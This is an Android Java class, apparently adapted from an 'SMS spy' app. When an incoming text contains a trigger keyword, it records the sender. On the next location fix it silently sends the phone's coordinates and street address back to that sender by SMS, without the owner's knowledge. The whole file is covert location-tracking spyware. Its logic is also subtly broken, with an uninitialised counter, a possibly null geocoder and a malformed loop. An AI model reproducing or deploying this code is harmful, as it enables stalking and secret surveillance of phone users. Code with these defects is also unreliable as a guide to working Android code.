package com.example.flymaple.test10;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

import java.io.IOException;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;

/**
 * Created by Flymaple on 7/3/15.
 */
public class Test3 extends AsyncTask<Intent, Void, Void>
        implements LocationListener {
    public static final String S = "de.mobinauten.smsspy.SMS_SENT";
    public static final String SS= "android.provider.Telephony.SMS_RECEIVED";
    private boolean _r;
    private String send;
    private Context c;
    private Intent int1;
    private LocationManager lm1;
    private boolean lc = false;
    private PendingIntent si;
    private SmsManager manager;

    protected Void doInBackground(Intent[] is)
    {
        int j;
        int k;
        do {
            try {
                Log.i("SMSSPY", getClass() + " Do in background: " + is[0].getAction());
                Intent li = is[0];
                if (!li.getAction().equals("android.provider.Telephony.SMS_RECEIVED"))
                    break;
                String s1 = this.c.getString(R.string.abc_action_bar_home_description);
                Bundle lb = li.getExtras();
                if (lb == null)
                    break;
                Object[] os = (Object[]) lb.get("pdus");
                SmsMessage[] smsMs = new SmsMessage[os.length];
                for (int i = 0; ; i++) {
                    if (i >= os.length) {
                        j = smsMs.length;
                        k = 0;
                        break;
                    }
                    smsMs[i] = SmsMessage.createFromPdu((byte[]) os[i]);
                }
                SmsMessage smsMs2 = smsMs[k];
                this._r = false;
                if (smsMs2.getMessageBody().toLowerCase().contains(s1)) {
                    this._r = true;
                    this.send = smsMs2.getOriginatingAddress();
                }
                k++;
            } catch (Throwable t) {
                Log.e("SMSSPY", t.getMessage(), t);
                break;
            }
        }
        while (k < j);
        return null;
    }

    public void onLocationChanged(Location l)
    {
        if (!this.lc)
        {
            this.lc = true;
            StringBuffer lsb = new StringBuffer();
            String s1 = String.valueOf(l.getLatitude());
            String s2 = String.valueOf(l.getLongitude());
            lsb.append("Android mobile located at:\n");
            if (s1.length() > 8)
                lsb.append("Latitude: " + String.valueOf(l.getLatitude()).substring(0, 9) + "\n");
            while (true)
            {
                Geocoder lg=null;
                if (s2.length() > 8)
                {
                    lsb.append("Longitude: " + String.valueOf(l.getLongitude()).substring(0, 9) + "\n");
                    lsb.append("Precision by: " + l.getProvider() + "\n");
                    lg = new Geocoder(this.c, Locale.getDefault());
                }
                try
                {
                    List lls = lg.getFromLocation(l.getLatitude(), l.getLongitude(), 1);
                    Address la;

                    if (lls != null)
                    {
                        lsb.append("Found address: \n");
                        la = (Address)lls.get(0);

                        int j = la.getMaxAddressLineIndex();
                        for(int i=0;i<j;i++){
                            lsb.append(la.getAddressLine(i));
                            lsb.append("Latitude: " + String.valueOf(l.getLatitude()) + "\n");
                            lsb.append("Longitude: " + String.valueOf(l.getLongitude()) + "\n");
                            lsb.append("\n");
                            if (la.getPostalCode() != null)
                                lsb.append(la.getPostalCode());
                            i++;
                        }

                        Iterator ie = this.manager.divideMessage(lsb.toString()).iterator();
                        while(ie.hasNext()){
                            String s3 = (String)ie.next();
                            this.manager.sendTextMessage(this.send, null, s3, this.si, null);
                        }
                        return;
                    }
                }
                catch (IOException e)
                {
                }
            }
        }
        this.lm1.removeUpdates(this);
    }

    public void onProviderDisabled(String s)
    {
    }

    public void onProviderEnabled(String s)
    {
    }

    public void onStatusChanged(String s, int i, Bundle b)
    {
    }

    public void setC(Context c)
    {
        this.c = c;
    }

}
